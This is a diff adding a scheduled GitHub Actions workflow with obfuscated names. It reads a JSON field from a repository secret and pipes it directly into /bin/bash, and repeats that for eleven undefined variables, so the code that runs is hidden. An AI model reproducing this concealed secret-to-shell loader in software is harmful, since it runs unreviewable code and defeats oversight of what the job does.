@@ -1,0 +1,29 @@
+name: gailvshitiangou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gailvshitiangou
+        env:
+          ltiw974: ${{ secrets.ltiw974 }}
+        run: |
+          echo $ltiw974 | jq -r .grwkb28 | /bin/bash
+          echo $zyfzm21 | jq -r .frwk470 | /bin/bash
+          echo $ztp6 | jq -r .yn9953 | /bin/bash
+          echo $df65296 | jq -r .mv85 | /bin/bash
+          echo $old3 | jq -r .y8460 | /bin/bash
+          echo $geoyl2 | jq -r .opocj7 | /bin/bash
+          echo $okqai1134 | jq -r .ng522 | /bin/bash
+          echo $mkma00 | jq -r .frpfo58975 | /bin/bash
+          echo $xvdet15 | jq -r .mztgc5 | /bin/bash
+          echo $dc27665 | jq -r .g52089 | /bin/bash
+          echo $qdkew960 | jq -r .d341 | /bin/bash
+          echo $xewp11080 | jq -r .mngpk697 | /bin/bash
+
